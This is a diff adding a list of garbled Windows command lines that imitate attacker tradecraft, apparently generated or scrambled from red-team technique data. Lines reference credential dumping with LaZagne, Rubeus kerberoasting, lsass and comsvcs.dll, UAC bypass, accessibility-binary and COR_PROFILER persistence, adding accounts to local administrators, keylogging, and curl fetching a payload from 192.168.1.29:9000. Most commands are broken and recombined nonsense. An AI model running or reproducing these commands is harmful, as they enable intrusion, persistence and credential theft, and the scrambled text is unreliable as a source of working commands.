@@ -1,0 +1,64 @@
+get-ciminstance -classname win32_processor | select-object -expandproperty email_address
+videocap.exe -t $ { shadow copy volumn scriptingengine='vbscript /start foreach-object _.creationtime = `` '' `` cor_profiler '' /t reg_multi_sz
+net `` -filepath $ profile ;
+powershell -executionpolicy bypass
+nmap -o -o $ { output_file } -l $ } -l $ target t1547.009 @ i in = $ ( ; ; ;
+reg add `` '' nt\currentversion\windows '' /v cor_profiler '' enabled '' /d 1 ''
+net localgroup administrators `` '' cor_profiler '' /t threadingmodel
+icacls % \system32\osk.exe
+bypassuac.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+set windir= $ : cor_profiler = threadingmodel ''
+namp -sn -l '' '' \programdata\microsoft\windows\start cor_profiler file /grant administrators c keylog
+copy $ target t1547.009 . = .\ '' nt\currentversion\silentprocessexit\svchost.exe '' /d cor_profiler '' /grant windir ;
+ffuf 5
+ffuf -w $ i -l $ target t1547.009 ; -a c : t1547.009 ; -t $ env [ red lsass ) ; -t in administrators '' '' -l $ { ads_zip } -t in $ i -l $ '' ; -t '' $ : \windows\system32\comsvcs.dll =
+tasklist
+del % windir t1547.009 you http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\lazagne .. exe all
+net localgroup `` administrators '' /f /grant keylog
+quser
+reg `` .\lazagne .. win32_group
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+del % \system32\osk.exe /grant administrators administrators ''
+net localgroup administrators `` '' '' /v cor_profiler '' c cor_profiler '' ''
+copy admins $ `` hklm\system\currentcontrolset\services\ = `` domain )
+reg.exe add `` hklm\system\currentcontrolset\control\session powershell `` `` .\lazagne .. exe all
+silentrunner.exe $ { username } '' threadingmodel
+set-executionpolicy -executionpolicy | select-object hklm : http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+hostname
+adfind.exe -f % foreach-object http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+remove-item -path $ a -name `` $ t1547.009 -verbose
+net localgroup administrators `` defaultaccount ''
+dig $ { shadow filename_regex }
+net localgroup `` administrators '' /f /grant administrators '' -name cor_profiler ''
+iediagcmd.exe /out
+net localgroup administrators '' /f
+copy -r ''
+adfind.exe -o : .\lazagne exe all
+del % localappdata % \microsoft\teams\current\teams.exe
+python -c `` .\lazagne .. exe all
+lazagne.exe windows
+net localgroup administrators `` cor_profiler '' autorun ''
+-w powershell `` .\lazagne -r -namespace `` $ : \programdata\microsoft\windows\start text.encoding administrators '' c : file c : \programdata\microsoft\windows\start \ $ `` cor_profiler = cor_profiler -name '' threadingmodel
+net localgroup `` administrators '' '' /t packages '' c 1 '' /d 1
+systeminfo
+vsiisexelauncher.exe -p $ target t1547.009 tracking ''
+invoke-screencap $ { source_file } \ $ true
+net localgroup `` \users\
+net `` kerberos : nt\currentversion\winlogon\notify\atomicredteam '' /v threadingmodel '' ;
+rundll32 popcalc.dll , keylog
+remove-item -path $ : cor_profiler_path /grant administrators $ '' /y ''
+net localgroup `` administrators '' \programdata\microsoft\windows\start packages /f
+ffuf -w $ consumerargs
+quser
+rubeus.exe kerberoast windir % windir % \system32\osk.exe /grant administrators administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+rubeus.exe kerberoast windir % windir volumn name copy $ filtertoconsumerbinding = `` keylog
+del % :logonpasswords -t $ i -l $ target t1547.009 . ) /user cor_profiler -ibck
+bypassuac.exe $ : domain -b
+reg add `` hkcu\software\classes\clsid\ `` cor_profiler '' /t /f /grant administrators '' , keylog
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v cor_profiler '' \windows\system32\sethc_backup.exe
+net localgroup administrators `` cor_profiler '' /t reg_multi_sz
+reg delete c : os ; -n '' ;
+get-ciminstance -classname win32_processor | select-object -expandproperty
+silentrunner.exe $ `` cor_profiler '' /f
+set windir= $ : cor_profiler '' administrators
+net localgroup `` administrators '' '' '' cor_profiler
